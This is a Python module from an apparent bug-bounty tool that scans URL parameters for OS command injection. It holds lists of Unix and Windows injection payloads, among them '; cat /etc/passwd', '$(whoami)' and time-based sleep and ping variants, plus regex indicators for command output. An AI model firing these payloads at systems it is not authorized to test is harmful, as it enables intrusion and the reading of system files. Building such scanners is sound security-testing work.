"""Command Injection scanner for BugBountyCrawler."""

import re
import asyncio
import time
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class CommandInjectionScanner(BaseScanner):
    """Scanner for OS command injection vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize command injection scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "CommandInjectionScanner"
        
        # Command injection payloads for different OS
        self.unix_payloads = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
        ]
        
        self.windows_payloads = [
            "& dir",
            "| dir",
            "&& dir",
            "|| dir",
            "; dir",
            "& whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; whoami",
            "& ipconfig",
            "| ipconfig",
            "&& ipconfig",
            "|| ipconfig",
            "; ipconfig",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1",
            "; ping -n 5 127.0.0.1",
        ]
        
        # Time-based blind command injection payloads
        self.time_based_payloads = [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "; timeout 5",
            "| timeout 5",
            "&& timeout 5",
        ]
        
        # Command injection indicators in responses
        self.unix_indicators = [
            r'root:x:0:0:',
            r'daemon:x:1:1:',
            r'bin:x:2:2:',
            r'uid=\d+\(',
            r'gid=\d+\(',
            r'groups=\d+\(',
            r'total \d+',  # ls output
            r'drwx',  # directory permissions
            r'-rw-',  # file permissions
            r'/bin/',
            r'/usr/',
            r'/etc/',
            r'/home/',
            r'/root/',
        ]
        
        self.windows_indicators = [
            r'Volume in drive',
            r'Directory of',
            r'Windows',
            r'System32',
            r'Program Files',
            r'<DIR>',
            r'\d+ File\(s\)',
            r'\d+ Dir\(s\)',
            r'C:\\',
            r'D:\\',
            r'Ethernet adapter',
            r'IPv4 Address',
            r'Subnet Mask',
            r'Default Gateway',
            r'127\.0\.0\.1',
            r'localhost',
        ]
        
        # Time threshold for time-based detection
        self.time_threshold = 4.0
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for command injection vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make baseline request
            baseline_response = await self.make_request(url)
            response_time = baseline_response.headers.get("X-Response-Time", 0.0)
            status_code = baseline_response.status
            headers = dict(baseline_response.headers)
            content_length = int(baseline_response.headers.get("Content-Length", 0))
            
            baseline_content = await baseline_response.text()
            
            # Parse URL parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if not query_params:
                return ScanResult(
                    url=url,
                    findings=findings,
                    errors=errors,
                    response_time=response_time,
                    status_code=status_code,
                    headers=headers,
                    content_length=content_length
                )
            
            # Test each parameter
            for param_name, param_values in query_params.items():
                if param_values:
                    original_value = param_values[0]
                    
                    # Test Unix command injection
                    unix_findings = await self._test_unix_commands(
                        url, param_name, original_value
                    )
                    findings.extend(unix_findings)
                    
                    # Test Windows command injection
                    windows_findings = await self._test_windows_commands(
                        url, param_name, original_value
                    )
                    findings.extend(windows_findings)
                    
                    # Test time-based blind command injection
                    time_findings = await self._test_time_based_injection(
                        url, param_name, original_value
                    )
                    findings.extend(time_findings)
        
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _test_unix_commands(self, url: str, param_name: str, 
                                  original_value: str) -> List[Finding]:
        """Test for Unix command injection."""
        findings = []
        
        for payload in self.unix_payloads[:10]:  # Test first 10
            try:
                test_url = self._create_test_url(url, param_name, original_value + payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                # Check for command execution indicators
                for indicator in self.unix_indicators:
                    if re.search(indicator, content, re.IGNORECASE):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.COMMAND_INJECTION,
                            title=f"Unix Command Injection (Parameter: {param_name})",
                            description=f"Command injection detected in parameter '{param_name}' using payload: {payload}",
                            severity=FindingSeverity.CRITICAL,
                            impact="Command injection allows arbitrary OS command execution, leading to complete system compromise",
                            likelihood="high",
                            risk_score=9.5,
                            references=[
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://cwe.mitre.org/data/definitions/78.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "payload": payload,
                                "indicator": indicator,
                                "response_content": content[:500],
                                "os_type": "unix"
                            }
                        )
                        findings.append(finding)
                        return findings  # Stop after first finding
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_windows_commands(self, url: str, param_name: str, 
                                     original_value: str) -> List[Finding]:
        """Test for Windows command injection."""
        findings = []
        
        for payload in self.windows_payloads[:10]:  # Test first 10
            try:
                test_url = self._create_test_url(url, param_name, original_value + payload)
                
                response = await self.make_request(test_url)
                content = await response.text()
                
                # Check for command execution indicators
                for indicator in self.windows_indicators:
                    if re.search(indicator, content, re.IGNORECASE):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.COMMAND_INJECTION,
                            title=f"Windows Command Injection (Parameter: {param_name})",
                            description=f"Command injection detected in parameter '{param_name}' using payload: {payload}",
                            severity=FindingSeverity.CRITICAL,
                            impact="Command injection allows arbitrary OS command execution, leading to complete system compromise",
                            likelihood="high",
                            risk_score=9.5,
                            references=[
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://cwe.mitre.org/data/definitions/78.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "payload": payload,
                                "indicator": indicator,
                                "response_content": content[:500],
                                "os_type": "windows"
                            }
                        )
                        findings.append(finding)
                        return findings  # Stop after first finding
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_time_based_injection(self, url: str, param_name: str, 
                                        original_value: str) -> List[Finding]:
        """Test for time-based blind command injection."""
        findings = []
        
        for payload in self.time_based_payloads[:5]:  # Test first 5
            try:
                test_url = self._create_test_url(url, param_name, original_value + payload)
                
                start_time = time.time()
                response = await self.make_request(test_url)
                end_time = time.time()
                
                elapsed_time = end_time - start_time
                
                if elapsed_time >= self.time_threshold:
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.COMMAND_INJECTION,
                        title=f"Time-based Blind Command Injection (Parameter: {param_name})",
                        description=f"Time-based command injection detected in parameter '{param_name}' using payload: {payload}. Response time: {elapsed_time:.2f}s",
                        severity=FindingSeverity.CRITICAL,
                        impact="Blind command injection allows OS command execution without direct output visibility",
                        likelihood="high",
                        risk_score=9.0,
                        references=[
                            "https://owasp.org/www-community/attacks/Command_Injection",
                            "https://cwe.mitre.org/data/definitions/78.html"
                        ],
                        raw_data={
                            "parameter": param_name,
                            "payload": payload,
                            "response_time": elapsed_time,
                            "threshold": self.time_threshold,
                            "injection_type": "time_based_blind"
                        }
                    )
                    findings.append(finding)
                    return findings  # Stop after first finding
                
                await asyncio.sleep(0.2)
                
            except Exception:
                continue
        
        return findings
    
    def _create_test_url(self, url: str, param_name: str, payload: str) -> str:
        """Create test URL with command injection payload."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        query_params[param_name] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url

